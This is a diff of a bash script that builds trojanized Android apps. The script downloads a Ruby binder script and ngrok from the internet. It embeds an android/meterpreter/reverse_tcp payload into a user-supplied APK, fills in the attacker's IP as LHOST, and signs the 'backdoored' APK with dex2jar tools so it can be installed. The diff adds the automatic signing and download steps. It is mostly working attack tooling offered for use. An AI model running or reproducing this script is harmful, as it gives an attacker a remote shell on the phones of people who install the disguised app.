@@ -10,11 +10,10 @@ blue='\e[1;34m'         # Blue
 purple='\e[1;35m'       # Purple
 cyan='\e[1;36m'         # Cyan
 white='\e[0;37m'        # White
-fuschia="\033[0;35m"    # Fuschia
 nocol='\033[0m'         # Default
 
 function line {
-   echo -e "$fuschia---------------------------------------------------------------------------$nocol"
+   echo -e "$blue---------------------------------------------------------------------------$nocol"
 }
 
 function disp_banner {
@@ -40,7 +39,9 @@ if [ $(echo $UID) -ne 0 ]; then echo -e "$red Run this Script as root !!"; echo 
 # setting up work directory
 export work_dir="/tmp/apk-payload/$(date +%d%m%y_%H%M%S)"
 export cur_dir="$PWD"
+export files_dir="/root/apkPayloadFiles"
 mkdir -p $work_dir
+mkdir $files_dir 2>/dev/null
 
 # check for xterm and install if not present
 if [ `which xterm | wc -l` -eq 0 ];then
@@ -53,13 +54,13 @@ if [ `which xterm | wc -l` -eq 0 ];then
 fi
 
 # installing ruby and nokogiri
-if ! [ -e $HOME/.ruby_success ];then
+if ! [ -e $files_dir/.ruby_success ];then
 	echo -ne "$yellow -> Installing ruby\t\t[$nocol"
 	apt-get install -y build-essential patch ruby-dev zlib1g-dev liblzma-dev 1>/dev/null 2>/dev/null
 	gem install nokogiri 1>/dev/null 2>/dev/null
 	if [ $(which ruby | wc -l) -eq 1 ];then
 		echo -e "$green DONE$yellow ] $nocol"
-		touch $HOME/.ruby_success 2>/dev/null
+		touch $files_dir/.ruby_success 2>/dev/null
 	else echo -e "$red FAILED$yellow ] $nocol"; exit 1
 	fi
 fi
@@ -91,6 +92,9 @@ function exec_ngrok {
 
 # fetching ngrok and placing it in /usr/bin
 if ! [ -e /usr/bin/ngrok ];then
+   echo -en "$yellow -> ngrok not found ! Do you want to download (y/n) ? $green"
+   read dwn
+   if [ "$dwn" == "y" -o "$dwn" == "Y" ];then
    echo -ne "$yellow -> Downloading ngrok\t\t[$nocol"
    wget -qO $work_dir/ngrok.zip https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
    if [ `unzip -l $work_dir/ngrok.zip 1>/dev/null 2>/dev/null; echo $?` -eq 0 ];then
@@ -98,24 +102,40 @@ if ! [ -e /usr/bin/ngrok ];then
       echo -ne "$yellow -> Placing ngrok at /usr/bin\t[$nocol"
       unzip -qq $work_dir/ngrok.zip -d /usr/bin/
       if [ $? -eq 0 ];then echo -e "$green DONE$yellow ] $nocol"; else echo -e "$red FAILED$yellow ] $nocol"; fi
-   else rm $work_dir/ngrok.zip 2>/dev/null; echo -e "$red FAILED$yellow ] $nocol"; exit 1
+   else rm $work_dir/ngrok.zip 2>/dev/null; echo -e "$red FAILED$yellow ] $nocol"; exit 1; fi
    fi
 else exec_ngrok
 fi
 
 # fetch apk-embed-payload.rb
-if ! [ -e /root/apk-bind.rb ];then
+if ! [ -e /root/apkPayloadFiles/apk-bind.rb ];then
 	echo -ne "$yellow -> Fetching script\t\t[$nocol"
-	wget -qO /root/apk-bind.rb http://vinayakwadhwa.in/apk-embed-payload.rb
-	if [ -e /root/apk-bind.rb ];then
+	wget -qO /root/apkPayloadFiles/apk-bind.rb http://vinayakwadhwa.in/apk-embed-payload.rb
+	if [ -e /root/apkPayloadFiles/apk-bind.rb ];then
 		echo -e "$green DONE$yellow ] $nocol"
 	else echo -e "$red FAILED$yellow ] $nocol"; exit 1
 	fi
-else cp /root/apk-bind.rb $work_dir/apk-bind.rb 2>/dev/null
+else cp /root/apkPayloadFiles/apk-bind.rb $work_dir/apk-bind.rb 2>/dev/null
+fi
+
+# fetch dex tools
+if ! [ -e "/root/apkPayloadFiles/dex2jar-2.1-SNAPSHOT/d2j-apk-sign.sh" ];then
+	echo -ne "$yellow -> Fetching dex tools\t\t[$nocol"
+	wget -qO /tmp/dexTools.zip https://github.com/pxb1988/dex2jar/releases/download/2.1-nightly-26/dex-tools-2.1-20150601.060031-26.zip
+	if [ `unzip -l /tmp/dexTools.zip 1>/dev/null 2>/dev/null; echo $?` -eq 0 ];then
+		unzip -qq /tmp/dexTools.zip -d /root/apkPayloadFiles/
+		cp -r /root/apkPayloadFiles/dex2jar-2.1-SNAPSHOT $work_dir/dexTools 2>/dev/null
+		if [ -e "$work_dir/dexTools/d2j-apk-sign.sh" ];then
+			echo -e "$green DONE$yellow ] $nocol"
+		else echo -e "$red FAILED$yellow ] $nocol"; exit 1
+		fi
+	else echo -e "$red FAILED$yellow ] $nocol"; exit 1
+	fi
+else cp -r /root/apkPayloadFiles/dex2jar-2.1-SNAPSHOT $work_dir/dexTools 2>/dev/null
 fi
 
 # creating payload
-echo -ne "$yellow -> Enter path of apk : $green"
+echo -en "$yellow -> Enter path of apk ($purple You can drag and drop the apk here $yellow)\n$green"
 # check for correct apk path
 while read apk_path; do
     export apk_path=$(echo "$apk_path" | tr -d "'")
@@ -125,8 +145,14 @@ done
 export apk_name=mod-$(basename "$apk_path")
 cp "$apk_path" $work_dir/orig.apk 2>/dev/null
 echo -ne $nocol
-echo -en "$yellow -> Enter LHOST : $green"
-read lhost
+ip=`hostname -I`
+if [ -z "$ip" ];then
+	echo -en "$yellow -> Enter LHOST : $green"
+	read lhost
+else
+	echo -e "$yellow -> LHOST :$green $ip"
+	lhost="$ip"
+fi
 echo -ne $nocol
 echo -en "$yellow -> Enter LPORT : $green"
 read lport
@@ -135,16 +161,19 @@ export payload="android/meterpreter/reverse_tcp"
 cd $work_dir
 line
 ruby apk-bind.rb orig.apk -p $payload $lhost $lport
-line
 
-# check for payload
-export apk_out=$(find $work_dir -iname "*_backdoored.apk")
+# check for payload and sign it
+export apk_out=$(find $work_dir -iname "orig_backdoored.apk")
 if [ -n $apk_out ];then
+   cd $work_dir/dexTools
+   ./d2j-apk-sign.sh "$apk_out"
+   if [ -e "orig_backdoored-signed.apk" ];then apk_out="$work_dir/$apk_name"; fi
+   line
    echo -e "$yellow -> Your modified apk is at\n$green $apk_out $nocol"
    line
-   echo -ne "$yellow -> Press Enter to move\n$green $apk_out\n$yellow to$cyan $cur_dir/$apk_name $nocol"
+   echo -ne "$yellow -> Press Enter to move\n$green $apk_name\n$yellow to$cyan $cur_dir/ $nocol"
    read enterkey
-   mv $apk_out $cur_dir/"$apk_name" 2>/dev/null
+   mv $work_dir/dexTools/orig_backdoored-signed.apk "$cur_dir/$apk_name" 2>/dev/null
 else echo -e "$red Unable to bind$green $apk_name $red!! $nocol"
 fi
 line
